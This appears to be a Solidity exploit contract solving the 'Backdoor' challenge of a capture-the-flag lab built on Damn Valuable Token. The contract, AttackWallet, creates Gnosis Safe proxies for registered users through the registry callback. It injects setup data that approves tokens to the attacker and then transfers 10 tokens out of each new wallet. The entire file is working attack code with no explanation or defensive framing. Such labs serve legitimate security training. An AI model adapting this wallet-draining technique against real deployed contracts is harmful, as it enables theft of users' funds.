// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";


import "../DamnValuableToken.sol";

contract AttackWallet {
    address public attacker;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _attacker,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token
    ) {
        attacker = _attacker;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
    }

    function setupToken(address _tokenAddress, address _attacker) external {
        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
    }

    
    function exploit(address[] memory users, bytes memory setupData) external {
        for (uint256 i = 0; i < users.length; i++) {
            // Need to create a dynamically sized array for the user to meet signature req's
            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;

            // Create ABI call for proxy
            string
                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory initGnosis = abi.encodeWithSignature(
                signatureString,
                victim,
                uint256(1),
                address(this),
                setupData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    initGnosis,
                    123,
                    IProxyCreationCallback(walletRegistry)
                );

            DamnValuableToken(token).transferFrom(
                address(newProxy),
                attacker,
                10 ether
            );
        }
    }
}